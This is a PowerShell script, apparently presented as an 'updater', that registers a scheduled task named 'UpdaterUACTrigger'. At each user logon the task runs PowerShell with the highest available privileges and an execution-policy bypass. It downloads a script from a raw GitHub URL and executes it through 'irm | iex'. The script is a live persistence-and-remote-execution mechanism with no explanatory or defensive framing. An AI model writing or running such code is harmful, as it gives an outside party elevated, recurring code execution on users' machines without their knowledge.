$logPath = "C:\Windows\Temp\updater_log.txt"
function Write-Log {
    param ($msg)
    "[" + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "] $msg" | Out-File $logPath -Append -Encoding utf8
}

Write-Log "🔁 Script executed by user: $env:USERNAME"

# Check if this is an interactive user session (not SYSTEM or machine context)
$sessionCheck = (query user 2>$null | Select-String "$env:USERNAME")
if (-not $sessionCheck) {
    Write-Log "❌ No interactive user session found. Exiting..."
    return
}

# Remove old scheduled task
$taskName = "UpdaterUACTrigger"
schtasks /Delete /TN $taskName /F > $null 2>&1
Write-Log "🧹 Deleted old scheduled task '$taskName' if it existed"

# PowerShell path
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

# Define task XML to run script with UAC after login
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>Updater</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$ps</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save task XML
$taskPath = "$env:Temp\temp_task.xml"
$xml | Set-Content -Path $taskPath -Encoding Unicode

# Create scheduled task
schtasks /Create /TN $taskName /XML $taskPath /F | Out-Null
Write-Log "✅ Scheduled task '$taskName' created to run elevated after user login"
